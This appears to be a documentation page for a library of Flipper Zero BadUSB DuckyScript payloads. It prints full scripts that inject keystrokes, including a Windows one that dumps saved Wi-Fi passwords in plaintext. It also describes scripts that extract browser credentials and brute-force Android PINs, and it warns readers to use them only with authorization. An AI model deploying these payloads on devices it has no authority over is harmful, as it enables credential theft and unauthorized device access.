This page catalogs the scripts in the `BadUSB/` directory. Each file is a plain-text DuckyScript payload ready to drop into the `badusb/` folder on your Flipper's SD card. Scripts are written for specific operating systems — check the `REM Target:` comment at the top of each file before running.

<Warning>
  Use these scripts only on systems you own or have explicit written authorization to test. Unauthorized execution of BadUSB payloads is illegal in most jurisdictions.
</Warning>

---

## DuckyScript example

Before diving into the library, here is a representative script showing the structure every payload follows — comments, delays, key combinations, and string injection:

```text RickRoll_CMD_Win.txt
REM Title: Rick Roll Windows CMD
REM Author: Nando Kools | NanKooDev
REM Description: RickRoll in Windows Command Prompt
REM Target: Windows
GUI r
DELAY 1000
STRING curl http://ascii.live/rick
ENTER
DELAY 750
ALT ENTER
```

`GUI r` opens the Windows Run dialog. `STRING` types the curl command. `ALT ENTER` maximizes the Command Prompt window to fill the screen.

    The macOS rickroll is a good example of chaining app launch, URL open, and volume control in one script:

    ```text OSX_Rickroll.txt
    REM Title: macOS rickroll
    REM Author: Nils Streedain / spydamarkman
    REM Description: Opens a rickroll in YouTube in full screen at maximum volume.
    REM Target: macOS 11.0+
    DELAY 1000
    GUI SPACE
    DELAY 500
    STRING terminal
    DELAY 100
    ENTER
    DELAY 1000
    STRING open 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'
    ENTER
    DELAY 1000
    GUI TAB
    DELAY 100
    STRING osascript -e 'set volume 7' && killall Terminal
    ENTER
    DELAY 1500
    STRING f
    ```

    `GUI SPACE` opens Spotlight on macOS. After launching Terminal, `killall Terminal` closes the window so the YouTube tab is front and center.

  <Accordion title="Information gathering">
    Scripts that enumerate system state — useful for authorized audits and penetration testing reconnaissance.

    | File | Target | Description |
    |---|---|---|
    | `Show_WiFi_Passwords.txt` | Windows | Extracts saved Wi-Fi SSIDs and plaintext keys using `netsh wlan show profiles`. |
    | `Wifi_for_Flipper.txt` | Windows | Variant of Wi-Fi password extraction. |
    | `Wifi_and_Show_Passwords_for_Flipper.txt` | Windows | Combined Wi-Fi and saved password extraction. |
    | `Show_Saved_Passwords.txt` | Windows | Downloads and runs NirSoft WebBrowserPassView to export browser-saved credentials to an HTML file. |
    | `Show_Saved_Passwords_UPDATED.txt` | Windows | Updated version of the saved password exfiltration script. |
    | `Get-Connected-USBs.txt` | Windows 10 | Uses `Get-PnpDevice` to list all currently connected USB devices and writes the output to `USB-Connected.txt`. |
    | `PingMe.txt` | Windows 7/8/10/11 | Fires a GET request to a webhook URL to verify internet connectivity from the target. |

    The Wi-Fi password script is one of the simplest and most instructive payloads in the collection:

    ```text Show_WiFi_Passwords.txt
    REM Displays saved wireless passwords on screen
    REM Author: UberGuidoZ
    DELAY 2000
    GUI r
    DELAY 1000
    STRING cmd
    DELAY 500
    ENTER
    DELAY 2000
    STRING cls
    DELAY 250
    ENTER
    DELAY 250
    STRING for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | netsh wlan show profiles %j key=clear | findstr /C:"SSID name" /C:"Key Content"
    DELAY 250
    ENTER
    ```

    The USB enumeration script is similarly concise:

    ```text Get-Connected-USBs.txt
    REM Title: Get-Connected-USBs
    REM Author: atomicsec
    REM Target OS: Windows 10
    DELAY 2000
    GUI r
    DELAY 2000
    STRING powershell
    DELAY 250
    ENTER
    DELAY 2000
    STRING Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' } | Out-File -FilePath .\USB-Connected.txt
    ENTER
    ```

  <Accordion title="Android">
    Scripts targeting Android devices with USB debugging or OTG keyboard support.

    | File | Target | Description |
    |---|---|---|
    | `rickroll-android.txt` | Android | Opens the YouTube Rickroll in the Android browser and enters fullscreen using the `f` key. |
    | `265_4_Digit_Pin_BF.txt` | Android | Attempts 265 common 4-digit PIN combinations with 30-second lockout delays between batches. Includes the top 65 most-used PINs and the 5 least-used PINs. |
    | `Android_top65_4digit_pin_bf.txt` | Android | Focused brute-force using only the top 65 most common 4-digit Android PINs. |

    The Android Rickroll script shows how Android-targeted payloads use `GUI b` to open the browser:

    ```text rickroll-android.txt
    REM Just another rickroll payload but for android
    REM Credit: John Hickens
    GUI b
    DELAY 600
    ENTER
    DELAY 1000
    CTRL l
    DELAY 100
    STRING https://www.youtube.com/watch?v=xm3YgoEiEDc
    DELAY 100
    ENTER
    DELAY 500
    STRING f
    ```

    `GUI b` opens the default browser on most Android launchers. `CTRL l` focuses the address bar. The final `STRING f` triggers fullscreen once the page loads.

    <Warning>
      The PIN brute-force scripts (`265_4_Digit_Pin_BF.txt`, `Android_top65_4digit_pin_bf.txt`) must only be run against devices you own or have explicit authorization to test. Android devices lock after repeated failed attempts and may wipe after a threshold is reached depending on the device policy.
    </Warning>
